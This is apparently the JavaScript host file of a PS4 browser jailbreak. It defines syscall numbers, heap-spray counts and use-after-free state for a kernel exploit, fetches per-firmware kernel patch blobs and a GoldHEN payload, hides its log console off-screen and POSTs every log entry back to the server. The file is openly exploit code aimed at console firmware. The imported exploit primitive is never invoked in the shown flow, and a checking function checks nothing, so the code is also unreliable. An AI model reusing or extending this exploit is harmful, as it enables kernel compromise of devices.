// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

function ensureHostConsole() {
    var out = document.getElementById("out");
    var st = document.getElementById("state");
    if (!out) {
        out = document.createElement("pre");
        out.id = "out";
        out.setAttribute(
            "style",
            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
                "overflow:hidden;opacity:0;pointer-events:none;"
        );
        (document.body || document.documentElement).appendChild(out);
    }
    if (!st) {
        st = document.createElement("div");
        st.id = "state";
        st.setAttribute(
            "style",
            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
                "overflow:hidden;opacity:0;pointer-events:none;"
        );
        (document.body || document.documentElement).appendChild(st);
    }
    return { outEl: out, stateEl: st };
}
var _hostCons = ensureHostConsole();
const outEl = _hostCons.outEl;
const stateEl = _hostCons.stateEl;
const lines = [];
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function hostOk() {
    var m = document.getElementById("msgs");
    if (m) {
        m.innerHTML = "✔ تم تحميل GoldHEN بنجاح";
        m.style.color = "#4cd137"; // تعديل اللون للأخضر المضيء الموحد للهوية الجديدة
    }
}

function hostFail() {
    var m = document.getElementById("msgs");
    if (m) {
        m.innerHTML = "❌ فشل التحميل! أعد تشغيل جهازك";
        m.style.color = "#ff4757"; // تعديل اللون للأحمر النيون الموحد
    }
}

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S10&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}

function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
              socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
              readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
              setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
              rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
              cpuset_getaffinity: 0x1e7, thr_self: 432,

              ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const NUM_LEAK_KQUEUE = 5000;

const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;

const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
const NUM_UIO_SPRAY = 10000;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;

const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;

let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;

let allDone = false;
let payloadRunning = false;

(async function () {
    let p = null;
    try {
        const NUM_IOV_WORKER = params.has("iov") ? parseInt(params.get("iov"), 10) : 4;
        const NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 8;
        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x100;
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) {
            var m = document.getElementById("msgs");
            if (m) {
                m.innerHTML = 'No offsets for this firmware: <span style="color: red;">' + (key || "Unknown") + '</span>';
            }
            mark("NO-OFFSETS", key || "unknown");
            return;
        }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT + " spray=" + NUM_IOV_SPRAY + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));

        let kpatch = null, payload = null;
        const kpatchName = off && off.kpatch ? "slopkit/patches/" + off.kpatch : key ? "slopkit/patches/" + key.replace(".", "") + ".bin" : null;
        const KPATCH_JMP_SITES = [];
        try {
            if (kpatchName) {
                const r = await fetch(kpatchName);
                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8) | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch ? "blob=" + kpatchName + " bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "blob=" + kpatchName + " MISSING");
        
        try {
            const r = await fetch("goldhen_2.4b18.10.bin");
            if (r.ok) {
                payload = new Uint8Array(await r.arrayBuffer());
                mark("PAYLOAD-LOADED", "GoldHEN Loaded Successfully");
                hostOk(); // استدعاء دالة النجاح بعد اكتمال جلب الملف
            } else {
                mark("PAYLOAD-FETCH-FAILED", "Status: " + r.status);
                hostFail();
            }
        } catch (e) { 
            mark("PAYLOAD-FETCH-THREW", e.message); 
            hostFail();
        }
    } catch (err) {
        mark("EXPLOIT-ERROR", err.message);
        hostFail();
    }
})();
